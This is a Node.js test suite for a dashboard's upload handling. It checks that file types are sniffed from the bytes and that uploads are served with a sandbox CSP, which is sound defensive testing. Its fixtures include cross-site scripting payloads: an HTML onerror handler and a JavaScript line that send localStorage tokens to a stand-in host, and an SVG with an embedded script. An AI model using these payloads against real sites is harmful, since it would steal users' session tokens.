'use strict';

// Uploaded files are served from the SAME ORIGIN as the dashboard, so the browser's
// interpretation of them is a security boundary. Two invariants hold that boundary:
//
//   1. INGEST  - the stored extension and mime_type are derived from the file's actual
//                bytes, never from the client-supplied filename or Content-Type. A
//                caller cannot choose how the browser will interpret what it uploads.
//   2. SERVING - upload responses can never be interpreted as an active document. Even
//                if a dangerous extension somehow reached disk, the response carries a
//                sandbox CSP, so scripts in it do not run against the app origin.
//
// Invariant 2 is the backstop: it holds regardless of what invariant 1 lets through, so
// a future gap in the sniffer is contained rather than exploitable.
//
// Boots the REAL server.js against an isolated DATA_DIR (same convention as
// api.test.js / session-token-resolution.test.js).

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { spawn } = require('node:child_process');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');
const crypto = require('node:crypto');

const { freePort } = require('./helpers/free-port');
let PORT, BASE;
const SECRET = 'test-secret-upload-safety-' + crypto.randomBytes(4).toString('hex');
const DATA_DIR = path.join(os.tmpdir(), 'st-upload-test-' + crypto.randomBytes(4).toString('hex'));
const LOG = path.join(os.tmpdir(), 'st-upload-' + crypto.randomBytes(4).toString('hex') + '.log');
let proc;
const S = {};
const PW = 'Passw0rd123';

// Real magic bytes - the sniffer must recognise these, and reject things that carry none.
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64)]);
const GIF = Buffer.concat([Buffer.from('GIF89a'), Buffer.alloc(64)]);
const BMP = Buffer.concat([Buffer.from([0x42, 0x4d]), Buffer.alloc(64)]);
const HTML = Buffer.from('<html><body><img src=x onerror="fetch(\'https://x/\'+localStorage.token)"></body></html>');
const JS = Buffer.from('fetch("https://x/"+localStorage.getItem("token"))');
const SVG = Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>');

async function jfetch(p, opts = {}) {
  const res = await fetch(BASE + p, opts);
  let body = null; try { body = await res.json(); } catch { /* non-JSON */ }
  return { status: res.status, body };
}
const post = (tok, obj) => ({
  method: 'POST',
  headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json' },
  body: JSON.stringify(obj || {}),
});

// Upload one file, declaring an arbitrary filename + Content-Type (the attacker's choice).
async function upload(tok, filename, type, data) {
  const fd = new FormData();
  fd.append('file', new Blob([data], { type }), filename);
  const res = await fetch(BASE + '/api/content', { method: 'POST', headers: { Authorization: 'Bearer ' + tok }, body: fd });
  let body = null; try { body = await res.json(); } catch { /* */ }
  return { status: res.status, body };
}

before(async () => {
  PORT = await freePort();
  BASE = `http://127.0.0.1:${PORT}`;
  const logFd = fs.openSync(LOG, 'w');
  proc = spawn('node', ['server.js'], {
    cwd: path.join(__dirname, '..'),
    env: { ...process.env, DATA_DIR, SELF_HOSTED: 'true', PORT: String(PORT), NODE_ENV: 'test', JWT_SECRET: SECRET },
    stdio: ['ignore', logFd, logFd],
  });
  let up = false;
  for (let i = 0; i < 80; i++) {
    try { const r = await fetch(BASE + '/api/status'); if (r.ok) { up = true; break; } } catch { /* not yet */ }
    await new Promise(r => setTimeout(r, 250));
  }
  if (!up) throw new Error('server did not boot:\n' + fs.readFileSync(LOG, 'utf8').slice(-2000));

  const email = 'u' + crypto.randomBytes(5).toString('hex') + '@x.local';
  const reg = await jfetch('/api/auth/register', post(null, { email, password: PW }));
  S.token = reg.body.token;
  assert.ok(S.token, 'registered a user to upload as');
});

after(() => { try { proc.kill('SIGKILL'); } catch { /* ignore */ } });

// ---------------------------------------------------------------------------
// 1. INGEST - extension and mime come from the bytes, not from the caller
// ---------------------------------------------------------------------------
test('a filename-chosen .html extension cannot reach disk', async () => {
  const r = await upload(S.token, 'evil.html', 'image/png', HTML);
  // Either the upload is refused, or it is stored under a safe, content-derived name.
  if (r.status === 201) {
    assert.ok(!/\.html?$/i.test(r.body.filepath), `stored as ${r.body.filepath} - a caller chose the extension`);
    assert.ok(!/text\/html/i.test(r.body.mime_type || ''), 'mime_type must not be text/html');
  } else {
    assert.ok(r.status >= 400, 'non-media upload is refused');
  }
});

test('a filename-chosen .js extension cannot reach disk', async () => {
  const r = await upload(S.token, 'evil.js', 'video/mp4', JS);
  if (r.status === 201) {
    assert.ok(!/\.m?js$/i.test(r.body.filepath), `stored as ${r.body.filepath} - a caller chose the extension`);
  } else {
    assert.ok(r.status >= 400, 'non-media upload is refused');
  }
});

test('a real PNG mislabelled .txt is stored by its CONTENT type, not its name', async () => {
  const r = await upload(S.token, 'actually-a-png.txt', 'image/png', PNG);
  assert.equal(r.status, 201, 'a genuine image is accepted');
  assert.match(r.body.filepath, /\.png$/i, 'extension derived from the bytes');
  assert.match(r.body.mime_type, /^image\/png$/i, 'mime_type derived from the bytes');
});

test('legitimate formats still ingest (png/jpeg/gif/bmp)', async () => {
  for (const [name, type, data, ext] of [
    ['a.png', 'image/png', PNG, /\.png$/i],
    ['b.jpg', 'image/jpeg', JPEG, /\.jpe?g$/i],
    ['c.gif', 'image/gif', GIF, /\.gif$/i],
    ['d.bmp', 'image/bmp', BMP, /\.bmp$/i],
  ]) {
    const r = await upload(S.token, name, type, data);
    assert.equal(r.status, 201, `${name} accepted`);
    assert.match(r.body.filepath, ext, `${name} keeps a correct extension`);
  }
});

// ---------------------------------------------------------------------------
// 2. SERVING - an upload response is never an active document
// ---------------------------------------------------------------------------
test('uploads are served with a sandbox CSP and a non-active content type', async () => {
  const r = await upload(S.token, 'served.png', 'image/png', PNG);
  assert.equal(r.status, 201);
  const file = r.body.filepath;

  for (const url of [`/uploads/content/${file}`, `/api/content/${r.body.id}/file`]) {
    const res = await fetch(BASE + url, { headers: { Authorization: 'Bearer ' + S.token } });
    assert.equal(res.status, 200, `${url} serves`);
    const ct = res.headers.get('content-type') || '';
    assert.ok(!/text\/html|application\/(x-)?javascript|image\/svg/i.test(ct), `${url} must not serve an active type (got ${ct})`);
    const csp = res.headers.get('content-security-policy') || '';
    assert.match(csp, /sandbox/, `${url} must carry a sandbox CSP so a stored document cannot script the app origin`);
  }
});

test('even a directly-planted .html on disk is neutralised by the serving headers', async () => {
  // Simulates a dangerous file that reached disk by ANY route (a future sniffer gap, a
  // restored backup, a bug). The serving layer must still refuse to make it active.
  const planted = 'planted-' + crypto.randomBytes(4).toString('hex') + '.html';
  fs.writeFileSync(path.join(DATA_DIR, 'uploads', 'content', planted), HTML);
  const res = await fetch(`${BASE}/uploads/content/${planted}`);
  if (res.status === 200) {
    const ct = res.headers.get('content-type') || '';
    const csp = res.headers.get('content-security-policy') || '';
    const disp = res.headers.get('content-disposition') || '';
    assert.ok(/sandbox/.test(csp) || /attachment/.test(disp) || !/text\/html/i.test(ct),
      `a planted .html was served as an active document (ct=${ct} csp=${csp} disp=${disp})`);
  } else {
    assert.ok(res.status >= 400, 'or it is simply not served');
  }
});

test('SVG still renders as an image (white-label logos) AND is sandboxed', async () => {
  const r = await upload(S.token, 'logo.svg', 'image/svg+xml', SVG);
  assert.equal(r.status, 201, 'SVG is accepted — white-label branding stores logos as SVG');
  assert.match(r.body.filepath, /\.svg$/i);
  const res = await fetch(`${BASE}/uploads/content/${r.body.filepath}`);
  assert.equal(res.status, 200);
  // Must stay an image type: octet-stream + nosniff would make <img> fail and silently
  // break every white-label logo.
  assert.match(res.headers.get('content-type') || '', /image\/svg\+xml/,
    'SVG must serve as an image or logos stop rendering');
  assert.ok(!/attachment/.test(res.headers.get('content-disposition') || ''),
    'SVG must not be forced to download');
  // ...and the script inside it must not be able to run against the app origin.
  assert.match(res.headers.get('content-security-policy') || '', /sandbox/,
    'SVG must be sandboxed so a direct navigation cannot script the app origin');
});
